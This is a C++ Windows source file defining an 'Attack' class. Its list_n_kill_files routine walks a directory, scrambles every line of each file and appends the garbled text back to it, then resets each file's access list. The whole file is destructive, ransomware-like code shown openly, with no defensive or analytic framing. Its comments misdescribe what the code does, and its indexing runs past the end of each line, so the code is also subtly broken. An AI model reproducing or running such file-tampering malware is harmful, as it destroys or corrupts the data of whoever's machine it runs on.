#include "attack.h"

void Attack::SetFilePermission(LPCWSTR filename)
{
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	EXPLICIT_ACCESS ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	// create a well-known SID for the everyone group
	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0, &pEveryoneSID);

	// initialize an EXPLICIT_ACCESS structure for ACE
	ZeroMemory(&ea, 1 * sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = SPECIFIC_RIGHTS_ALL;
	ea[0].grfAccessMode = GRANT_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPCH)pEveryoneSID;

	// Create a new ACL that contains the new ACEs
	SetEntriesInAcl(1, ea, NULL, &pACL);

	// Initialize a security descriptor
	PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);

	// Add the ACL to the security descriptor 
	SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE); // not a default DACL

													   // Change the security attributes
	SetFileSecurity(filename, DACL_SECURITY_INFORMATION, pSD);

	if (pEveryoneSID)
	{
		FreeSid(pEveryoneSID);
	}
	if (pACL)
	{
		LocalFree(pACL);
	}
	if (pSD)
	{
		LocalFree(pSD);
	}
}

vector<wstring> Attack::list_n_kill_files(wstring path)
{
	vector<wstring> subdirs, matches;
	WIN32_FIND_DATA ffd;
	HANDLE hFind = FindFirstFile((_T(path) + L"\\*.*").c_str(), &ffd);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			wstring filename = _T(ffd.cFileName);
			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				wstring file_path = path + L"\\" + filename;
				matches.push_back(file_path);

				std::wcout << "Opening contents of " << filename << std::endl;

				// open file for writing
				std::ofstream outfile;
				if (outfile.fail())
				{
					std::wcout << "Can't open file " << filename << "!" << std::endl;
				}
				else {
					string readout;
					string replace;

					std::cout << "Writing to file..." << std::endl;
					// for read
					ifstream file_read(file_path);
					// for write
					outfile.open(file_path, std::ios::in | ::ios::out | std::ios::app);
					while (getline(file_read, readout))
					{
						std::cout << "Replacing line..." << std::endl;
						std::cout << readout << std::endl << std::endl;
						// replace each letter of word in file
						for (int i = 0; i < readout.length() + 1; i++)
						{
							// shift letters up one, power up 3
							replace += readout[i + 1 ^ 3];
						}
						// append replaced strings to file
						outfile << replace + "\n";
						replace.clear();
					}
					// set file permissions to admin if not admin : lock
					SetFilePermission(file_path.c_str());

					// close files
					file_read.close();
					outfile.close();
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);
	}
	else {
		std::cout << "Can't find files in directory" << std::endl;
	}
	FindClose(hFind);
	return matches;
}